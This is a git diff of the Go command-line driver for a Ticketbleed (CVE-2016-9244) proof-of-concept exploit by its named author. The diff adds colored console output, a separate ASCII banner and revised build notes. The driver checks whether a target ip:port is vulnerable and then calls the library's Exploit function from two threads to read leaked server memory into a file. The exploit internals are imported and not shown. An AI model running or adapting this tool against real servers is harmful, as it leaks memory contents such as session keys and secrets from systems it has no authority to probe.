@@ -9,10 +9,10 @@
 
 
 This is the proof of consept file for CVE-2016-9244, 
-move this file out of the Ticketbleed library and remove ".tmp" extetion then build it with following...
+don't forget to set up GOPATH before building...
 
 BUILD:
-	go get github.com/EgeBalci/Ticketbleed
+	export GOPATH="The path of this repo here"
 	go build Ticketbleed.go
 
 USAGE:
@@ -25,11 +25,23 @@ OPTIONS:
 */
 package main
 
-import "github.com/EgeBalci/Ticketbleed"
+import "Ticketbleed"
 import "strconv"
 import "strings"
-import "fmt"
+import "color"
 import "os"
+
+
+
+var Red *color.Color = color.New(color.FgRed)
+var BoldRed *color.Color = Red.Add(color.Bold)
+var	Blue *color.Color = color.New(color.FgBlue)
+var	BoldBlue *color.Color = Blue.Add(color.Bold)
+var	Yellow *color.Color = color.New(color.FgYellow)
+var	BoldYellow *color.Color = Yellow.Add(color.Bold)
+var	Green *color.Color = color.New(color.FgGreen)
+var	BoldGreen *color.Color = Green.Add(color.Bold)
+
 
 
 var OutputFile string = ""
@@ -40,14 +52,16 @@ func main() {
 
 	ARGS := os.Args[1:]
 	if len(ARGS) < 1 || len(ARGS) > 5{
-		fmt.Println(Help)
+		BoldRed.Println(Banner)
+		Green.Println(Help)
 		os.Exit(1)
 	}
 
   	for i := 0; i < len(ARGS); i++{
 
 		if ARGS[i] == "-h" || ARGS[i] == "--help"{
-			fmt.Println(Help)
+			BoldRed.Println(Banner)
+			Green.Println(Help)
 			os.Exit(1)
 	  	}
 
@@ -58,11 +72,11 @@ func main() {
 	  	if ARGS[i] == "-s" || ARGS[i] == "--size"{
 	  		Size,err := strconv.Atoi(ARGS[i+1])
 	  		if err != nil {
-	  			fmt.Println("[-] ERROR: Invalid size value !")
+	  			BoldRed.Println("[-] ERROR: Invalid size value !")
 	  			os.Exit(1)
 	  		}
 	  		if Size < 0 {
-	  			fmt.Println("[-] ERROR: Size can't be smaller than 0")
+	  			BoldRed.Println("[-] ERROR: Size can't be smaller than 0")
 	  			os.Exit(1)
 	  		}else{
 	  			BleedSize = Size
@@ -73,26 +87,27 @@ func main() {
 	if OutputFile != "" {
 		File, FileErr := os.Create(OutputFile)
 		if FileErr != nil {
-			fmt.Println("[-] ERROR: While creating output file !")
+			BoldRed.Println("[-] ERROR: While creating output file !")
 			os.Exit(1)
 		}
 		File.Close()
-		fmt.Println("[*] Output file: "+OutputFile)
+		BoldYellow.Println("[*] Output file: "+OutputFile)
 	}
 
  	VulnStatus := Ticketbleed.Check(ARGS[0])								// First check if it's vulnerable
- 	fmt.Println(VulnStatus)
  	if strings.Contains(VulnStatus, "[+]") {
- 		
+ 		BoldGreen.Println(VulnStatus)
  		go Ticketbleed.Exploit(ARGS[0], OutputFile, (BleedSize/2))  		// With using multiple threads it is easyer to move on stack
  		Ticketbleed.Exploit(ARGS[0], OutputFile, (BleedSize/2))				// Othervise server echoes back alot of duplicate value
+ 	}else{
+ 		BoldYellow.Println(VulnStatus)
  	}
 
 }
 
 
 
-var Help string = `
+var Banner string = `
 ▄▄▄█████▓ ██▓ ▄████▄   ██ ▄█▀▓█████▄▄▄█████▓ ▄▄▄▄    ██▓    ▓█████ ▓█████ ▓█████▄ 
 ▓  ██▒ ▓▒▓██▒▒██▀ ▀█   ██▄█▒ ▓█   ▀▓  ██▒ ▓▒▓█████▄ ▓██▒    ▓█   ▀ ▓█   ▀ ▒██▀ ██▌
 ▒ ▓██░ ▒░▒██▒▒▓█    ▄ ▓███▄░ ▒███  ▒ ▓██░ ▒░▒██▒ ▄██▒██░    ▒███   ▒███   ░██   █▌
@@ -103,15 +118,16 @@ var Help string = `
   ░       ▒ ░░        ░ ░░ ░    ░    ░       ░    ░   ░ ░      ░      ░    ░ ░  ░ 
           ░  ░ ░      ░  ░      ░  ░         ░          ░  ░   ░  ░   ░  ░   ░    
              ░                                    ░                        ░      
-
+`
+var Help string = `
 Author: Ege Balci
-Github: github.com/EgeBalci
+Github: github.com/EgeBalci/Ticketbleed
 
 
 USAGE: 
 	./ticketbleed <ip:port> <options> 
 OPTIONS:
 	-o, --out 	Output filename for raw memory
-	-s, --size 	Size in bytes to read
+	-s, --size 	Size in bytes to read (Output value may vary)
 	-h, --help 	Print this message
 `
